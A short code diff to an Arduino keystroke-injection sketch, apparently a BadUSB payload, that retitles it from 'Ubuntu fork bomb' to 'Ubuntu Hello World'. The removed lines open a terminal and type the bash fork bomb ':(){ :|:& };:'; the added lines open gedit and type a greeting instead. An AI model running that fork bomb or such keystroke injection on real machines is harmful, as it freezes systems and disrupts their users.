@@ -1,4 +1,4 @@
-// Title: Ubuntu fork bomb
+// Title: Ubuntu Hello World
 // Author: Rennan Cockles
 
 #include <Keyboard.h>
@@ -15,12 +15,11 @@ void setup() {
 void loop() {
     kb.ALT_F2();
     delay(500);
-    kb.STRING("gnome-terminal");
+    kb.STRING("gedit");
     kb.ENTER();
     delay(1500);
-    kb.STRING(":(){ :|:& };:");
+    kb.STRING("Hello World!!");
     kb.ENTER();
-    delay(500);
 
     delay(300000);
 }
